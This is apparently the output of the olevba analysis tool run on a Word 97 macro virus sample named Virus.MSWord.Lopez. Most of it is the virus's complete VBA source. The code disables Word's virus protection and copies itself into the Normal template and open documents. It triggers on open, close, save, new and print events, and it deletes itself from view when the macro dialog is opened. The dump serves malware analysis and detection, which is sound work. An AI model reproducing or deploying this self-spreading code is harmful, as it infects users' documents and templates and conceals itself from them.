olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lopez
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lopez - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Word97Virus1.bas 
in file: Virus.MSWord.Lopez - OLE stream: 'Macros/VBA/Word97Virus1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Word97Virus1()
Attribute Word97Virus1.VB_Description = "Macro created 04/20/98 by Evelyn N. Lopez"
Attribute Word97Virus1.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.Word97Virus1"
'
' Word97Virus1 Macro
'

If Application.Version = "8.0" Then

Dim Iflag
Dim I
Options.VirusProtection = False
Options.SaveNormalPrompt = False

Iflag = 0

' Check Global Template for Infection

For I = 1 To WordBasic.CountMacros(0, 0)
    If WordBasic.[MacroName$](I, 0, 0) = "Word97Virus1" Then
        Iflag = 1
    End If
Next I

' Is Global Infected?
If Iflag = 1 Then
' Yes - Jump to GlobInf
    GoTo GLobInf
Else
' No - Infect
    On Error Resume Next
    Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "Word97Virus1", wdOrganizerObjectProjectItems
    Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "NewMacros", wdOrganizerObjectProjectItems
End If
GLobInf:

Iflag = 0

' Check Active Document for Infection
For I = 1 To WordBasic.CountMacros(1, 0)
    If WordBasic.[MacroName$](I, 1, 0) = "Word97Virus1" Then
        Iflag = 1
    End If
Next I

' Is it infected?
If Iflag = 1 Then
' Yes - Jump to FileInf
    GoTo FileInf
Else
' No - Infect
    On Error Resume Next
    Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "Word97Virus1", wdOrganizerObjectProjectItems
    Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "NewMacros", wdOrganizerObjectProjectItems
End If
FileInf:
' Check for Payload Trigger


End If
End Sub
Sub AutoNew()
Application.Run "Word97Virus1"
End Sub
Sub AutoClose()
Application.Run "Word97Virus1"
End Sub
Sub AutoExec()
Application.Run "Word97Virus1"
End Sub
Sub AutoSave()
Application.Run "Word97Virus1"
End Sub
Sub AutoOpen()
Application.Run "Word97Virus1"
End Sub
Sub FileClose()
Application.Run "Word97Virus1"
Dialogs(wdDialogFileClose).Show
End Sub
Sub FileNew()
Dialogs(wdDialogFileNew).Show
Application.Run "Word97Virus1"
End Sub
Sub FileSaveAs()
Application.Run "Word97Virus1"
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePrint()
Selection.Font.Name = "Courier"
Selection.Font.Size = 8
Selection.Font.Bold = True
Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
Selection.InsertAfter Text:="hE wHo LiVeS iN tHe PaSt HaS nO ChAnCe To SuRviVe In ThE fUtUrE..."
Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
Dialogs(wdDialogFileOpen).Show
Application.Run "Word97Virus1"
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Lopez - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ToolsMacro()
Attribute ToolsMacro.VB_Description = "Runs, creates, deletes, or revises a macro"
Attribute ToolsMacro.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.ToolsMacro"
Application.OrganizerDelete ActiveDocument.FullName, "Word97Virus1", wdOrganizerObjectProjectItems
Application.OrganizerDelete NormalTemplate.FullName, "Word97Virus1", wdOrganizerObjectProjectItems
Dialogs(wdDialogToolsMacro).Show
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

